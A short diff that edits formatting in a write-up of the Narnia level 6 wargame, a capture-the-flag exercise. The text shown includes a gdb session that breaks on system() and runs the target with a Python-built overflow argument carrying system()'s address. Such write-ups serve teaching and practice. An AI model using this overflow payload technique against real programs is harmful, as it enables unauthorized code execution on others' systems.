@@ -21,9 +21,7 @@ narnia6@melinda:/narnia$ cat narnia6.c
     Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */
 #include <stdio.h>
-```
-`#include <stdlib.h>` **<---- Contains system() function**``
-```  
+#include <stdlib.h>` <--------------- Contains system() function
 #include <string.h>
 
 extern char **environ;
@@ -89,7 +87,7 @@ Start it from the beginning? (y or n) y
 Starting program: /games/narnia/narnia6 a b
 
 Breakpoint 1, 0x0804855d in main ()  
-(gdb) break system  **<---- Put a breakpoint at the memory location of system()**  
+(gdb) break system  <--------------- Put a breakpoint at the memory location of system() 
 Breakpoint 2 at 0xf7e62e70  
 Starting program: /games/narnia/narnia6 $(python -c'print "A"*8 +  "\x70\x2e\xe6\xf7" +  " " + "C"*8')
 
